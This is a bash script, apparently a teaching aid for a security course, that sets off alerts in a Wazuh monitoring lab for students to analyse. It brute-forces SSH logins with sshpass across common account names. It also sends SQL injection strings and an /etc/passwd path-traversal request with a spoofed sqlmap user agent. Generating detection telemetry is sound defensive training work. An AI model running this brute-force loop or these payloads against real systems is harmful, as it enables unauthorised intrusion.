#!/usr/bin/env bash
# =============================================================================
#  generate_wazuh_telemetry.sh - INSTRUCTOR helper (Docker-free).
#
#  Generates REAL attack telemetry that shows up in the shared Wazuh, so students
#  can detect and analyze it in Module 2. Students never run this; you do, once.
#
#  It works by attacking a MONITORED target - a host that has a Wazuh agent
#  reporting to 10.50.136.116. The Wazuh all-in-one self-monitors its own host, so
#  the simplest target is the Wazuh VM itself (its sshd). You can also target any
#  endpoint you enrolled (see docker/wazuh-agent/README.md).
#
#  Run from any Linux box that can reach the target over the network:
#     bash scripts/generate_wazuh_telemetry.sh <target-host> [web-port]
#  Example (attack the self-monitored Wazuh VM's sshd):
#     bash scripts/generate_wazuh_telemetry.sh 10.50.136.116
#
#  Raises: SSH failed-password 5710/5712 and the burst rule 100120; with a web
#  port, SQLi/traversal that a monitored web log flags as 100101.
# =============================================================================
set -uo pipefail
TARGET="${1:-}"
WEBPORT="${2:-}"
if [ -z "$TARGET" ]; then
  echo "Usage: $0 <monitored-target-host> [web-port]"
  echo "  e.g. $0 10.50.136.116          # brute-force the self-monitored Wazuh VM sshd"
  echo "       $0 10.50.136.120 8081     # also send web SQLi/traversal to an endpoint"
  exit 1
fi

if ! command -v sshpass >/dev/null 2>&1; then
  echo "[!] sshpass is needed for the SSH burst. Install it:"
  echo "    sudo apt-get update && sudo apt-get install -y sshpass"
  exit 1
fi

echo "[*] SSH brute force against ${TARGET} (raises Wazuh 5710/5712, then 100120 after the burst)..."
USERS=(admin root oracle postgres deploy admin root admin backup svc_web admin root)
for u in "${USERS[@]}"; do
  # Force a password attempt with a wrong password so sshd logs 'Failed password'.
  sshpass -p "Wr0ngPass!$RANDOM" ssh \
    -o PreferredAuthentications=password -o PubkeyAuthentication=no \
    -o StrictHostKeyChecking=no -o ConnectTimeout=4 \
    "${u}@${TARGET}" true 2>/dev/null
done
echo "[*] SSH burst complete (12 failed logins)."

if [ -n "$WEBPORT" ]; then
  echo "[*] Web SQLi + traversal against http://${TARGET}:${WEBPORT} (raises 100101 if the web log is monitored)..."
  curl -s -A "sqlmap/1.7" "http://${TARGET}:${WEBPORT}/login?user=admin&pass=' OR '1'='1" -o /dev/null || true
  curl -s -A "sqlmap/1.7" "http://${TARGET}:${WEBPORT}/login?user=' UNION SELECT NULL-- -" -o /dev/null || true
  curl -s "http://${TARGET}:${WEBPORT}/../../etc/passwd" -o /dev/null || true
  echo "[*] Web attack requests sent."
fi

echo
echo "[*] Done. Confirm the alerts landed in the shared Wazuh:"
echo "      python3 common/wazuh_client.py --alerts 30 --min-level 5"
echo "    or open the dashboard: https://10.50.136.116 (Security events, last 15 min)."
